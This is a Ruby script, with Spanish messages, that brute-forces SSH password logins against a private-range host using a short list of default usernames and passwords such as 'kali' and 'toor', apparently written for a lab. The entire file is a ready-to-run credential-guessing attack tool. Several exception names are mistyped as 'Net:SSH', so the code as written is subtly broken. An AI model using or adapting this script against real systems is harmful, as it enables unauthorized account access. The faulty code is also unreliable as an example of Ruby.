#!/usr/bin/env ruby
require 'net/ssh' # gem install net-ssh

def attack_ssh(host, user, password, port=22, timeout=5)
    begin
        Net::SSH.start(host,user, :password => password,
        :auth_methods => ["password"], :port => port,
        :non_interactive => true, :timeout => timeout) do |session|
        puts "Password found: #{host} | #{user}:#{password}"
        end
    rescue Net:SSH::ConnectionTimeout
        puts "[!] El host '#{host}' no esta vivo"
    rescue Net:SSH::Timeout
        puts "[!] El host '#{host}' se encuentra desconectado"
    rescue Errno::ECONNREFUSED
        puts "[!] El puerto #{port} incorrecto para el host '#{host}'"
    rescue Net:SSH::AuthenticationFailed
        puts "password incorrecta"
    rescue Net:SSH::Authentication::DisallowedMethod
        puts "[!] El host no acepta password"
    end
end
        
hosts = ['192.168.109.128']
users = ['admin','user','kali']
pass = ['toor', '123456', 'admin']

hosts.each do |host|
    users.each do |user|
        pass.each do |pass|
            attack_ssh host, user, pass
        end
    end
end
